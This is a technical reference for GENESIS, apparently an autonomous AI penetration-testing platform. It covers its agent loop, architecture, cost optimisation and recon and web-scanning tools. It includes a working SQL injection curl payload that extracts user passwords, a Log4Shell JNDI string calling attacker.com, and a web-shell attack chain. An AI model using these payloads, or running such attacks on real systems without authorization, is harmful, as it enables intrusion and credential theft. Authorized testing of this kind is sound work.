# GENESIS — Comprehensive Technical Reference

**Version:** 2.0 (MYTHOS Engine)  
**Audience:** Security practitioners, AI engineers, and newcomers to both fields  
**Purpose:** Complete technical deep-dive into GENESIS — its architecture, tools, AI models, attack types, assessment flow, and design decisions

---

## Table of Contents

1. [What Is GENESIS?](#1-what-is-genesis)
2. [Why This Exists — The Problem It Solves](#2-why-this-exists)
3. [Core Cybersecurity Concepts (Starting from Zero)](#3-core-cybersecurity-concepts)
4. [Core AI Concepts (Starting from Zero)](#4-core-ai-concepts)
5. [System Architecture — How Everything Connects](#5-system-architecture)
6. [The AI Engine — MYTHOS Orchestrator](#6-the-ai-engine)
7. [Model Selection & Comparison](#7-model-selection--comparison)
8. [Cost Optimization — Three Engineering Decisions](#8-cost-optimization)
9. [All 47 Tools — Definitions, Use Cases, What They Find](#9-all-47-tools)
10. [Attack Types — Plain English Explanations](#10-attack-types)
11. [Novel Vulnerability Detection Systems](#11-novel-vulnerability-detection-systems)
12. [Hypothesis Journal & Adversarial Critic](#12-hypothesis-journal--adversarial-critic)
13. [Multi-Agent Mode — Parallel Intelligence](#13-multi-agent-mode)
14. [MITRE ATT&CK Framework — What It Is and How GENESIS Uses It](#14-mitre-attck-framework)
15. [Scan Profiles — When to Use Each](#15-scan-profiles)
16. [The Full Assessment Flow — Step by Step](#16-the-full-assessment-flow)
17. [Complete Attack Chain Examples](#17-complete-attack-chain-examples)
18. [Data Architecture — What Gets Stored Where](#18-data-architecture)
19. [Cross-Session Intelligence Library](#19-cross-session-intelligence-library)
20. [Security Model — What GENESIS Will and Won't Do](#20-security-model)
21. [Glossary](#21-glossary)
22. [Testing a Lab Target — Practical Walkthrough](#22-testing-a-lab-target)
23. [How GENESIS Finds Novel Vulnerabilities — Web Apps and Operating Systems](#23-how-genesis-finds-novel-vulnerabilities)

---

## 1. What Is GENESIS?

GENESIS is an **autonomous AI-powered security assessment platform**. It uses a large language model (Claude) to reason about a target computer system, select security testing tools, interpret what they find, form hypotheses, chain discoveries into multi-step attack paths, and generate exact code fixes — all without a human directing each step.

### The Elevator Pitch

Think of it this way: a human security tester (called a "penetration tester" or "pen tester") spends days or weeks probing a target system. They use dozens of specialized tools, interpret the results with years of domain knowledge, connect findings across tools, and write a report. GENESIS automates that reasoning process. It is not a script that runs tools in a fixed order — it thinks, adapts, and pivots exactly like an experienced human tester would.

### What GENESIS Is Not

- **Not a script.** Traditional scanners follow a fixed sequence. GENESIS makes decisions.
- **Not a magic box.** Every decision is visible in the "Deep Thought" panel. You can see exactly what Claude was thinking before each tool call.
- **Not a replacement for human judgment.** GENESIS is a force multiplier. Highly context-dependent business logic, physical security, social engineering, and executive-level reporting still benefit from human expertise.
- **Not a weapon.** It is designed for authorized testing only and refuses destructive actions.

---

## 2. Why This Exists — The Problem It Solves

### The Status Quo

Traditional security assessment has three options:

| Option | Speed | Depth | Cost | Scales? |
|---|---|---|---|---|
| Human pen tester | Slow (weeks) | High | Very high (£5k–£50k+) | No |
| Automated scanner (Nessus, OpenVAS) | Fast (hours) | Shallow | Medium | Yes |
| Bug bounty hunters | Variable | Medium | Variable | Partially |

The core problem: **human expertise does not scale, and automated scanners don't reason**. A scanner runs signatures against known CVEs. It will miss a novel logic flaw because it does not understand what the application is trying to do.

### The GENESIS Hypothesis

If you give a sufficiently powerful language model:
1. Full access to the same tools a human tester uses
2. The ability to reason step-by-step before each decision
3. Enough context to correlate findings across tools and iterations
4. Instructions to form and test hypotheses systematically

…it can perform a security assessment that approaches human quality at a fraction of the cost and time, 24/7, without fatigue.

---

## 3. Core Cybersecurity Concepts (Starting from Zero)

### 3.1 What Is a Vulnerability?

A **vulnerability** is a weakness in a system that could be exploited by an attacker. Vulnerabilities fall into several categories:

- **Software bugs** — code that behaves incorrectly under certain inputs
- **Configuration errors** — software installed with insecure default settings
- **Design flaws** — the system was designed in a way that is inherently insecure
- **Logic errors** — the application's business rules can be abused in unintended ways

### 3.2 What Is a Penetration Test?

A **penetration test** ("pen test") is an authorized attempt to attack a system to find vulnerabilities before real attackers do. The goal is not to destroy or steal anything — it is to discover weaknesses so they can be fixed.

Pen tests follow a lifecycle:

```
Reconnaissance → Scanning → Enumeration → Exploitation → Reporting
```

- **Reconnaissance**: Gather information about the target (what servers are running, what software, what domain names, what email addresses)
- **Scanning**: Probe the target for open ports and running services
- **Enumeration**: Dig into specific services to understand what they are and what version
- **Exploitation**: Attempt to exploit discovered vulnerabilities to confirm they are real
- **Reporting**: Document findings with severity scores, proof-of-concept code, and remediation guidance

### 3.3 What Is a Port?

A **port** is a numbered endpoint on a computer that a program "listens" on. Like a building with multiple doors — each door (port) leads to a different room (service). Port 80 is HTTP web traffic. Port 443 is HTTPS (encrypted web). Port 22 is SSH (remote terminal access). Port 3306 is MySQL (database). When GENESIS runs nmap, it is knocking on each of these doors to see which ones are open and what is behind them.

### 3.4 What Is a CVE?

A **CVE** (Common Vulnerabilities and Exposures) is a standardized identifier for a publicly known vulnerability. Example: `CVE-2021-44228` is the identifier for Log4Shell, a critical vulnerability in the Java logging library Log4j. CVE numbers allow security teams to reference the same vulnerability consistently. GENESIS maps findings to CVE IDs where applicable.

### 3.5 What Is a CVSS Score?

**CVSS** (Common Vulnerability Scoring System) is a numerical score from 0 to 10 that measures the severity of a vulnerability:

| Score | Severity |
|---|---|
| 9.0–10.0 | Critical |
| 7.0–8.9 | High |
| 4.0–6.9 | Medium |
| 0.1–3.9 | Low |
| 0.0 | Informational |

The score is calculated from: how easy is it to exploit, does the attacker need authentication, can they do it remotely, and what is the impact (data loss, system takeover, service disruption).

### 3.6 What Is an Attack Chain?

An **attack chain** (also called a "kill chain") is a sequence of individual vulnerabilities or weaknesses that, when combined, lead to a significant compromise. One finding alone might be low severity. Three findings chained together might lead to full system access.

Example of a real attack chain:
```
Step 1: Web server has a directory listing enabled (Low severity, info leak)
    ↓ reveals a backup file
Step 2: Backup file contains database credentials (Medium severity)
    ↓ credentials used to log in to the database
Step 3: Database runs as root with file write access (High severity)
    ↓ attacker writes a web shell
Step 4: Remote Code Execution via web shell (Critical)
```

GENESIS explicitly builds and tracks these chains, assigning each vulnerability a `chain_id` and `chain_position`.

### 3.7 What Is a Zero-Day?

A **zero-day** vulnerability is one that is not publicly known and has no patch available. The term comes from "zero days of warning" — the vendor has had zero days to fix it. Zero-days are highly valuable to attackers because no automatic scanner will detect them (they do not appear in CVE databases). GENESIS can discover zero-days by reasoning about application logic rather than just comparing against known signatures.

---

## 4. Core AI Concepts (Starting from Zero)

### 4.1 What Is a Large Language Model?

A **Large Language Model (LLM)** is an AI system trained on vast quantities of text to understand and generate human language. Models like Claude (by Anthropic) and GPT-4 (by OpenAI) can read technical documentation, understand code, reason about problems, and produce coherent text or code as output.

The key insight: LLMs are not just word predictors. The best models exhibit genuine reasoning — they can break down complex problems into steps, maintain context across a long conversation, and change their approach when new information contradicts a prior assumption.

### 4.2 What Is "Extended Thinking"?

**Extended Thinking** is a capability specific to Anthropic's Claude models. Before producing visible output, the model is given a "thinking budget" — a number of internal reasoning tokens it can use privately, like scratch paper, before writing its final response.

This is crucial for security work because the model can:
- Think through attack surface implications before choosing a tool
- Reconsider a hypothesis when a tool returns unexpected results
- Reason about multi-step chains without exposing half-formed thoughts
- Work through technical details (like SQL injection variants) systematically

Without extended thinking, the model produces the first reasonable response. With it, the model explores the problem space more thoroughly before committing to an action.

**In GENESIS**, the thinking budget is **adaptive**: 
- 8,000 tokens at the start (forming the initial hypothesis)  
- 3,000 tokens during routine tool selection (mid-session)
- 8,000 tokens at the end (correlating all findings into chains)

This saves ~60% of thinking costs while maintaining depth where it matters most.

### 4.3 What Is an Agent Loop?

An **agent loop** is the structure that allows an AI to take actions in the real world, observe results, and repeat. GENESIS's loop works like this:

```
┌──────────────────────────────────────────────────────┐
│                    AGENT LOOP                        │
│                                                      │
│  1. Claude receives: system prompt + message history │
│  2. Claude thinks (extended thinking)               │
│  3. Claude either:                                   │
│     a) Calls a tool (nmap, sqlmap, etc.)             │
│     b) Emits text (hypothesis, vulnerability, etc.)  │
│  4. Tool result appended to message history          │
│  5. Repeat from step 1                               │
│                                                      │
│  Exit conditions:                                    │
│  - Claude emits FINAL_REPORT                         │
│  - Iteration limit reached                           │
│  - Session paused or stopped by user                 │
└──────────────────────────────────────────────────────┘
```

Each "iteration" of the loop costs tokens (money). GENESIS manages this cost through prompt caching, adaptive thinking, and history compression.

### 4.4 What Are Tool Schemas?

When Claude is given tools to use, it needs a description of each tool: its name, what it does, and what parameters it accepts. These descriptions are called **tool schemas**. GENESIS sends Claude all 37 tool schemas at the beginning of each session. Claude reads them and decides which tools to call and with what parameters.

Example schema (simplified):
```json
{
  "name": "nmap_scan",
  "description": "Run nmap port scan. Returns open ports, services, OS fingerprinting.",
  "parameters": {
    "target": "IP address or hostname to scan",
    "ports": "Port range (e.g. '1-1000' or '-' for all ports)",
    "flags": "Extra nmap flags (e.g. '-sV -sC' for service/script scanning)"
  }
}
```

Claude uses this schema to construct a valid tool call — exactly like a programmer reading an API documentation.

### 4.5 What Is Prompt Caching?

**Prompt caching** is an Anthropic feature that stores a portion of the input (the system prompt + tool schemas) in a fast memory cache on Anthropic's servers. The first API call pays full price to write the cache. Every subsequent call within 5 minutes reads from the cache at 90% lower cost.

Without caching: Each iteration resends ~7,000 tokens of static content. At $3/million tokens for Sonnet, this costs $0.021 per iteration, or $1.05 across 50 iterations — just for content that never changes.

With caching: Iterations 2–50 pay $0.30/million tokens for that same content. The same 50-iteration session costs $0.13 for the cached portion — a saving of $0.92.

### 4.6 What Is Message History / Context Window?

An LLM receives its entire conversation history with every API call. This "context window" has a size limit measured in tokens. As a session runs and tool outputs accumulate, the history grows. By iteration 50, without management, the history can reach 100,000+ tokens — significantly increasing cost and approaching context limits.

GENESIS manages this with **history compression**: every 15 iterations, the oldest 12 messages are summarized into a compact bullet-point summary by a separate Claude call. This keeps the working history lean without losing important findings.

---

## 5. System Architecture — How Everything Connects

### 5.1 Components

```
┌─────────────────────────────────────────────────────────────────────┐
│                        SECURITY ANALYST                            │
│                Configure target  ·  Choose scan profile            │
└──────────────────────────────┬──────────────────────────────────────┘
                               │  HTTPS + X-API-Key header
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     REACT FRONTEND  :3000                           │
│   Dashboard · Session Viewer · Attack Graph · Intelligence · About  │
│   Real-time updates via WebSocket · Stores API key in browser       │
└────────────────────────────┬────────────────────────────────────────┘
                             │  REST API + WebSocket
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                   FASTAPI BACKEND  :8000                            │
│   Authentication (X-API-Key) · Session CRUD · WebSocket relay       │
│   OOB callback server · Session working memory API                  │
└───────┬────────────────────────────────────────────┬───────────────┘
        │ enqueues via Redis                          │ persists to
        ▼                                            ▼
┌───────────────┐   ┌───────────────┐   ┌────────────────────────────┐
│  REDIS :6379  │   │ POSTGRESQL    │   │  MONGODB                   │
│ Celery broker │   │ sessions      │   │ tool_outputs               │
│ Task queue    │   │ vulnerabilities│   │ agent_thoughts             │
│ Session memory│   │ settings      │   │ deep_thoughts              │
│ OOB callback  │   │               │   │ hypothesis_journals        │
└───────┬───────┘   └───────────────┘   └────────────────────────────┘
        │ worker picks up task
        ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      CELERY WORKER                                  │
│         Runs assessment as a background task                        │
│         Routes to Solo or Multi-Agent orchestrator                  │
└──────────────────────────────┬──────────────────────────────────────┘
                               │
        ┌──────────────────────┴──────────────────────┐
        │  agent_mode = solo                           │  agent_mode = multi_agent
        ▼                                             ▼
┌────────────────────────┐          ┌─────────────────────────────────┐
│  SOLO ORCHESTRATOR     │          │  MULTI-AGENT ORCHESTRATOR       │
│  Claude MYTHOS         │          │  Recon · Analyst · Exploit      │
│  37 tools available    │          │  Code · Strategist agents       │
│  Hypothesis journal    │          │  All run in parallel             │
│  Adversarial critic    │          │  Strategist correlates findings  │
│  OOB/Race/Diff probes  │          └─────────────────────────────────┘
└────────────┬───────────┘
             │ JSON-RPC over HTTP
             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                   MCP TOOL SERVER  :3001                            │
│   37 tools registered · Binary availability checked at startup      │
│   Tool execution sandboxed · Results returned as structured JSON    │
└─────────────────────────────────────────────────────────────────────┘
             │ stores completed session patterns
             ▼
┌─────────────────────────────────────────────────────────────────────┐
│            INTELLIGENCE LIBRARY  (ChromaDB  :8001)                  │
│   Indexes confirmed vulns + attack patterns as embedding vectors    │
│   Queried at session start to recall similar past assessments       │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.2 Communication Protocols

| Connection | Protocol | Purpose |
|---|---|---|
| Browser → Backend | HTTPS REST | Session creation, settings, vulnerability queries |
| Browser → Backend | WebSocket | Real-time streaming of agent thoughts, tool outputs, vulnerability findings |
| Backend → Celery | Redis queue | Dispatching assessment tasks asynchronously |
| Orchestrator → MCP | HTTP JSON-RPC | Tool execution requests and results |
| Backend → Anthropic | HTTPS | Claude API calls (model inference) |
| Backend → Redis | Redis protocol | OOB callback storage, session working memory |

### 5.3 Authentication

GENESIS uses a single **X-API-Key** header for authentication. The key is set in the admin settings panel and stored in PostgreSQL. Every browser request includes this key automatically. The OOB callback endpoint (`/api/v1/callback/hit/{token}`) is the only unauthenticated endpoint — because remote servers triggering SSRF callbacks obviously cannot send the API key.

---

## 6. The AI Engine — MYTHOS Orchestrator

### 6.1 The System Prompt (MYTHOS)

The system prompt is the "personality and instructions" given to Claude at the start of every session. It runs to approximately 4,000 tokens and contains:

- The target IP address and session ID
- The agent's role and mission (elite red team operator)
- The `HYPOTHESIS` JSON format it must use
- The OOB testing workflow (generate → inject → check)
- The `session_memory` usage guidance
- The `VULNERABILITY` output JSON format (exactly how to report a finding)
- The `TOPOLOGY_UPDATE` format (how to build the network graph)
- The `FINAL_REPORT` format (how to signal completion)
- Scan profile-specific instructions
- Past intelligence from similar sessions (if available)
- Hard rules (no destructive commands)

This prompt is sent with `cache_control: ephemeral` so it is cached by Anthropic and not re-billed on every iteration.

### 6.2 The Vulnerability Output Format

When Claude discovers a vulnerability, it must emit a precisely structured JSON block:

```json
{
  "VULNERABILITY": {
    "title": "SQL Injection in /api/users Endpoint",
    "severity": "critical",
    "cvss_score": 9.8,
    "cve_ids": [],
    "affected_service": "Node.js Express API",
    "port": 3000,
    "description": "The 'id' parameter in GET /api/users?id= is directly interpolated into a SQL query without sanitization. An attacker can retrieve all database records.",
    "exploit_code": "curl 'http://10.10.0.11:3000/api/users?id=1 UNION SELECT username,password,3 FROM users--'",
    "patch_code": "// Replace string interpolation with parameterized query\nconst query = 'SELECT * FROM users WHERE id = ?';\ndb.query(query, [req.query.id], callback);",
    "remediation": "Use parameterized queries or prepared statements. Never concatenate user input into SQL strings.",
    "confidence": 0.95,
    "attack_chain_id": "chain-1",
    "chain_position": 2,
    "verification_status": "confirmed",
    "mitre_techniques": ["T1190"],
    "is_zero_day": false,
    "evidence_for": [
      "sqlmap_test returned 'GET parameter id is vulnerable — union-based injection confirmed'",
      "response differential: baseline=412 bytes, payload=8204 bytes (returned full users table)"
    ],
    "endpoint": "/api/users",
    "technique_tag": "sqli-union-based"
  }
}
```

The backend parses this JSON block from Claude's text output using a bracket-matching parser (not regex, since JSON can be deeply nested), saves it to PostgreSQL, and broadcasts it to the frontend via WebSocket.

#### Evidence Rules (Enforced by the Platform — Mythos Tier-1)

`evidence_for` is **required** when `verification_status` is `"confirmed"` or `"exploited"`. The platform enforces three rules during save in `ai_orchestrator._save_vulnerability()`:

1. **No evidence cited → auto-downgrade.** A confirmed/exploited finding with an empty or missing `evidence_for` list is rewritten to `unverified` before insert, and the reason is recorded in the row's `verification_output` audit field.
2. **Blind-class vulns require a real OOB hit.** If the title or description contains blind-class keywords (`blind`, `oob`, `out-of-band`, `time-based`, `dns-exfil`), the platform scans every `evidence_for` entry for 32-char hex tokens and checks Redis under `genesis:oob:{token}` for actual hit records. If no token in evidence has registered a hit, the finding is downgraded to `unverified`.
3. **Always-on adversarial critic.** Every finding claimed as `confirmed` or `exploited` is routed through the critic (Claude Haiku) with the cited evidence. The critic returns `confirmed` or `disputed`; the platform uses the verdict even if that means downgrading a high-confidence claim. For `unverified` findings with `confidence >= 0.6`, the critic can also promote them when evidence is strong.

Each `evidence_for` entry should be a **concrete observable**, not a paraphrase:

- `"idor_probe returned status_mismatch: id=7 -> 200, id=8 -> 200 with different user_id in body"`
- `"jwt_probe confirmed alg:none accepted; server returned 200 on forged admin token"`
- `"oob_check token a1b2c3d4e5f6...  registered 1 DNS hit from target"`
- `"response length delta: baseline=412, payload=48 (3x difference indicating boolean blind SQLi)"`

The optional `endpoint` and `technique_tag` fields feed the cross-session intelligence library (see §19). Use short technique tags like `jwt-alg-none`, `cache-xfh-reflection`, `nosql-ne-boolean`, `graphql-introspection`, `ssrf-metadata`, `sqli-union-based` — consistent tags are how the library recognises that a technique that worked on target A may also work on target B.

### 6.3 The Hypothesis Format

Before each tool call, Claude emits a structured hypothesis:

```json
{
  "HYPOTHESIS": {
    "id": "h3",
    "statement": "The /api/transfer endpoint is vulnerable to a race condition — the balance check and deduction are not atomic, so two concurrent requests can both succeed",
    "confidence": 0.7,
    "evidence_for": [
      "Endpoint performs a balance check followed by deduction in two separate queries",
      "No locking mechanism visible in the API response headers"
    ],
    "evidence_against": [
      "Server may use database-level transactions"
    ],
    "next_test": "Send 20 concurrent POST requests to /api/transfer and check if multiple succeed",
    "status": "active"
  }
}
```

Status transitions:
- `active` → hypothesis is being tested
- `confirmed` → evidence supports the hypothesis, vulnerability likely real
- `ruled_out` → evidence contradicts the hypothesis, moving on

These are stored in MongoDB and shown live in the Hypotheses tab.

### 6.4 The Agent's Decision Hierarchy

At each iteration, Claude internally prioritizes:

1. **Is there an untested hypothesis with high confidence?** → Test it directly
2. **Did the last tool reveal something unexpected?** → Pivot to investigate
3. **Are there unexplored attack surfaces?** → Enumerate them
4. **Have I been in recon for too long?** → Move to exploitation phase
5. **Am I near the iteration limit?** → Start wrapping up findings
6. **Have I thoroughly assessed the target?** → Emit FINAL_REPORT

This is not a hard-coded state machine — it emerges from Claude's reasoning given the system prompt instructions.

---

## 7. Model Selection & Comparison

### 7.1 Why Claude?

Anthropic's Claude is the primary model for three reasons:

**Extended Thinking** — Claude Sonnet 4.6 and Opus 4.7 support a private reasoning buffer (thinking tokens) that are never shown to the user but allow the model to reason more thoroughly before responding. This is the single most important feature for security assessment. Without it, the model produces the first reasonable action rather than the most strategically sound one.

**Tool Use** — Claude has native support for structured tool calls with type-safe parameter schemas. This integrates directly with the 37 GENESIS tools.

**Long Context** — Claude supports 200,000+ token context windows, allowing it to hold large tool outputs and session history without truncation.

### 7.2 Claude Model Comparison

| Model | Context | Thinking | Speed | Cost/M tokens (input/output) | Best For |
|---|---|---|---|---|---|
| Claude Haiku 4.5 | 200k | No | Very fast | ~$0.80 / $4 | Adversarial critic, formatting tasks |
| Claude Sonnet 4.6 | 200k | Yes (extended) | Fast | ~$3 / $15 | Primary assessment model (recommended) |
| Claude Opus 4.7 | 200k | Yes (extended) | Slower | ~$15 / $75 | Maximum depth, APT simulation |

**Recommendation**: Sonnet 4.6 for most assessments. Opus 4.7 for `apt_sim` and `full` profiles where depth matters more than cost.

### 7.3 Why NOT GPT-4o Mini?

GPT-4o mini fine-tuned would cost approximately $0.15/M input tokens — roughly 20× cheaper than Sonnet 4.6. However:

| Capability | Claude Sonnet 4.6 | GPT-4o Mini (fine-tuned) |
|---|---|---|
| Extended thinking | ✅ Yes (up to 10k tokens) | ❌ No |
| Multi-hop vulnerability chaining | ✅ Can reason across 50+ iterations | ⚠️ Pattern-matches known chains |
| Zero-day discovery | ✅ Reasons about novel logic flaws | ❌ Relies on training data patterns |
| Cross-endpoint correlation | ✅ Active reasoning with session memory | ⚠️ Limited |
| Known CVE detection | ✅ Good | ✅ Good (fine-tuned) |

Fine-tuning adds pattern recall — the ability to recognize known vulnerability patterns faster and more accurately. It does not add reasoning depth. A fine-tuned mini model would be excellent at finding CVE-2021-44228 reliably; it would miss a novel business logic flaw that requires reasoning "what would happen if I skipped step 3 of this 5-step checkout flow?"

**The correct use of GPT-4o mini** (if cost is a priority): As a post-processing sub-agent that takes Claude's raw findings and formats them into clean JSON — not as the primary reasoning engine.

### 7.4 What The Three Optimisations Actually Saved

Without any optimization, a Deep session (50 iterations) costs approximately:

| Cost driver | Calculation | Cost |
|---|---|---|
| System prompt + 37 tool schemas resent every call | 7,500 tokens × 50 calls × $3/M | $1.13 |
| 10,000 thinking tokens per iteration | 10,000 × 50 × $15/M | $7.50 |
| Message history grows quadratically | Average 22k input tokens × 50 × $3/M | $3.30 |
| **Total** | | **~$11.93** |

After the three optimisations:

| Cost driver | Calculation | Cost |
|---|---|---|
| Prompt caching (reads at $0.30/M from iter 2) | 7,500 × 49 × $0.30/M | $0.11 |
| Adaptive thinking (avg 3,800 tokens) | 3,800 × 50 × $15/M | $2.85 |
| History compression (avg 8k input tokens) | 8,000 × 50 × $3/M | $1.20 |
| **Total** | | **~$4.16** |

**Overall saving: ~65%**

---

## 8. Cost Optimization — Three Engineering Decisions

### 8.1 Decision 1: Prompt Caching

**What changed in code:**

```python
# Before: plain string — resent every API call
system_for_api = system_prompt

# After: list with cache_control — written once, read at 90% discount
system_for_api = [
    {"type": "text", "text": system_prompt, "cache_control": {"type": "ephemeral"}}
]

# Also cache the last tool schema (marks the end of the cacheable prefix)
cached_tools[-1]["cache_control"] = {"type": "ephemeral"}

# Beta header activates the feature
create_kwargs["extra_headers"] = {"anthropic-beta": "prompt-caching-2024-07-31"}
```

**Why the last tool schema?** Anthropic's caching marks a "breakpoint" — everything before the last `cache_control` marker is cached. By marking the last tool schema, we cache the entire system prompt + all 37 tool schemas in one block.

**TTL note:** The cache expires after 5 minutes of inactivity. For long-running sessions with tool calls taking >5 minutes, the cache may miss. This is acceptable — the cache hit rate across a 50-iteration session is still high.

### 8.2 Decision 2: Adaptive Thinking Budget

**What changed in code:**

```python
def _thinking_budget(iteration: int, max_iter: int) -> int:
    pct = iteration / max_iter
    if pct <= 0.10 or pct >= 0.85:
        return 8000   # first 10% + last 15% — deep reasoning needed
    return 3000       # routine mid-session tool selection
```

**Why this shape?**

- **First 10%** (iterations 1–5 in a 50-iter session): Claude is forming its initial attack surface model. It needs to reason deeply about what technologies are present, what the likely attack vectors are, and which tools to prioritize. Low budget here leads to shallow initial reconnaissance.

- **Middle 75%** (iterations 6–43): Most of these are "pick the next tool given what I've already found." The choice is usually straightforward. 3,000 tokens is sufficient for routine selection.

- **Last 15%** (iterations 44–50): Claude is correlating all findings, building kill chains, generating exploit code and patches, and writing the final report. This requires reviewing 40+ iterations of findings and reasoning about their relationships. Low budget here produces shallow, poorly connected final reports.

### 8.3 Decision 3: Message History Compression

**What changed in code:**

```python
async def _compress_history(self, messages, client, model, iteration):
    COMPRESS_EVERY = 15   # run every 15 iterations
    COMPRESS_WINDOW = 12  # collapse these many messages
    KEEP_TAIL = 4         # always keep 4 most recent messages verbatim

    if iteration % COMPRESS_EVERY != 0:
        return messages
    if len(messages) < 1 + COMPRESS_WINDOW + KEEP_TAIL:
        return messages

    head = messages[:1]                       # initial user prompt (always kept)
    body = messages[1 : 1 + COMPRESS_WINDOW]  # compress this window
    tail = messages[1 + COMPRESS_WINDOW :]    # keep recent messages verbatim

    resp = await client.messages.create(
        model=model,
        max_tokens=1200,
        system="Summarise this security assessment conversation into a compact progress block...",
        messages=body,
    )
    summary = resp.content[0].text

    compressed = {"role": "user", "content": f"[COMPRESSED PROGRESS — iters up to {iteration}]\n{summary}"}
    return head + [compressed] + tail
```

**Why keep the initial prompt?** Claude needs to remember the original goal and target. Compressing the initial user message would cause it to forget what it is supposed to be doing.

**Why keep the tail verbatim?** The 4 most recent messages contain the last tool call and result. Claude needs exact context for what just happened to make a coherent next decision.

**What does a summary look like?**

```
PROGRESS SUMMARY (iterations 1–12):
• Tools run: nmap (all ports), httpx (80,443,8080), nikto (port 80)
• Open ports: 22/ssh (OpenSSH 8.4), 80/http (Apache 2.4.49), 443/https, 3306/mysql
• Technologies: Apache 2.4.49, PHP 7.4, WordPress 5.8, MySQL 8.0
• Vulnerabilities confirmed:
  - Apache path traversal (CVE-2021-41773) — CRITICAL — chain-1
• Attack chains forming:
  - chain-1: Apache path traversal → LFI → potential RCE (in progress)
• Credentials found: none yet
• Endpoints discovered: /wp-admin, /wp-login.php, /backup/ (403)
```

---

## 9. All 47 Tools — Definitions, Use Cases, What They Find

### Category 1: Reconnaissance (7 Tools)

Reconnaissance is the first phase — gathering information about the target without (or with minimal) direct probing.

---

#### `nmap` — Network Mapper
**What it is:** The gold standard of network scanning. Created in 1997, used in every serious security assessment.

**What it does:** Sends network packets to a target and analyzes the responses to determine which ports are open, what services are running on them, what version those services are, and what operating system the host is running.

**How it works technically:** Nmap sends TCP SYN packets to each port. If the port is open, the target responds with SYN-ACK. If closed, it responds with RST. If filtered (firewall), no response comes. It can also send UDP probes, OS fingerprinting packets, and run NSE (Nmap Scripting Engine) scripts.

**What GENESIS uses it for:** Initial discovery of attack surface. Example call: `nmap -sV -sC -p- 10.10.0.11` to scan all 65535 ports with service detection and default scripts.

**What it finds:** Open ports, service names and versions (e.g. "Apache httpd 2.4.49"), OS (Windows Server 2019), known vulnerable service banners.

**Example output interpretation:**
```
22/tcp   open  ssh      OpenSSH 8.4p1
80/tcp   open  http     Apache httpd 2.4.49
443/tcp  open  ssl/http Apache httpd 2.4.49
3306/tcp open  mysql    MySQL 8.0.26
```
From this, Claude knows: there is a web server (ports 80/443), a database (MySQL on 3306 — is it exposed to the internet?), and SSH (can we brute-force credentials?).

---

#### `masscan` — Mass Port Scanner
**What it is:** An ultra-fast port scanner that can scan the entire IPv4 internet in under 6 minutes.

**What it does:** Same concept as nmap but optimized for raw speed. It sends millions of packets per second using an asynchronous network stack.

**When GENESIS uses it:** On large networks or when speed matters. Masscan identifies which hosts are alive and which ports are open, then nmap performs deep scanning on what masscan found.

**What it finds:** Open TCP/UDP ports across large IP ranges.

**Limitation:** Masscan is fast but less precise than nmap. It does not do service detection or scripting. It is used for discovery, not analysis.

---

#### `amass` — Attack Surface Mapping
**What it is:** The most comprehensive subdomain discovery tool, using 50+ data sources.

**What it does:** Enumerates subdomains of a target domain using passive sources (DNS records, certificate transparency logs, APIs like Shodan, SecurityTrails, VirusTotal) and active techniques (DNS brute-forcing, zone transfers).

**Why subdomains matter:** A company's main website might be well-secured, but `staging.company.com`, `dev-api.company.com`, or `admin.company.com` might be forgotten and vulnerable.

**What GENESIS uses it for:** When the target is a domain name. Example: `amass enum -d company.com` might reveal `jenkins.company.com` — a forgotten CI/CD server with default credentials.

---

#### `subfinder` — Passive Subdomain Discovery
**What it is:** A fast, focused passive subdomain finder.

**What it does:** Queries 45+ passive sources (Certificate Transparency logs, DNS records, public APIs) without sending a single packet to the target.

**Difference from amass:** Subfinder is faster and stealthier (no active DNS probes). Amass is more thorough. GENESIS uses both.

---

#### `dnsrecon` — DNS Reconnaissance
**What it is:** A comprehensive DNS analysis tool.

**What it does:** Queries DNS servers for all record types (A, AAAA, MX, NS, SOA, TXT, CNAME, SRV), attempts zone transfers (AXFR), and performs reverse DNS lookups.

**Zone transfer explained:** A DNS zone transfer is a mechanism that allows DNS servers to replicate their database. If misconfigured, any host can request a full copy of the DNS zone, revealing all internal hostnames, IP addresses, and infrastructure layout — essentially a complete map of the internal network.

**What GENESIS finds with it:** Zone transfer misconfiguration (critical), internal hostnames, mail server details, SPF/DKIM records (email security), subdomains not indexed by search engines.

---

#### `theHarvester` — OSINT Email and Host Harvester
**What it is:** An Open Source Intelligence (OSINT) tool that collects email addresses, hostnames, IPs, and employee names from public sources.

**What it does:** Queries search engines (Bing, Google, DuckDuckGo), LinkedIn, GitHub, Shodan, HaveIBeenPwned, and many others.

**Why it matters:** Harvested email addresses → phishing simulations. Employee names → password spray targets (employees often use first.last@company.com as username). Found URLs → additional attack surface.

---

#### `httpx` — HTTP Prober
**What it is:** A fast multi-purpose HTTP toolkit.

**What it does:** Sends HTTP/HTTPS requests to a list of targets and returns status codes, response titles, technology fingerprints, redirect chains, and TLS information.

**What GENESIS uses it for:** After nmap identifies open web ports, httpx probes all of them to understand what is actually running. A port that responds to nmap might be a web application, an API, an admin panel, or an error page — httpx tells which.

**What it finds:** Live web services, response codes, technology stacks (via server headers and HTML signatures), redirect targets, HTTPS/HTTP mismatches.

---

### Category 2: Web Scanning (12 Tools)

Web scanning tools actively probe web applications for vulnerabilities. These tools interact with the application in ways that simulate attacker behavior.

---

#### `nikto` — Web Server Scanner
**What it is:** One of the oldest web vulnerability scanners, comprehensive and noisy.

**What it does:** Sends thousands of HTTP requests testing for known misconfigurations, outdated software, dangerous files, and common vulnerabilities. Not stealthy — leaves obvious traces in web server logs.

**What it finds:** 
- Exposed admin panels (`/manager/`, `/admin/`, `/wp-admin/`)
- Dangerous files (`.git`, `.env`, `phpinfo.php`, `web.config`)
- Outdated software versions
- Missing security headers (X-Frame-Options, HSTS, CSP)
- Default credentials on web interfaces
- Server information disclosure

---

#### `nuclei` — Template-Based Vulnerability Scanner
**What it is:** The most powerful automated vulnerability scanner, using community-maintained YAML templates.

**What it does:** Runs thousands of templates against a target, each template testing for a specific vulnerability. Templates exist for CVEs, misconfigurations, default credentials, exposed panels, and more. The community adds new templates within hours of vulnerability disclosures.

**Template example:** A nuclei template for Log4Shell (CVE-2021-44228) sends an HTTP request with `${jndi:ldap://attacker.com/}` in headers, then checks if the target made an outbound DNS request to the attacker's server — confirming the vulnerability without needing to exploit it.

**What it finds:** Known CVEs, misconfigured cloud services, exposed admin panels, default credentials, security header issues, exposed API keys, and more.

---

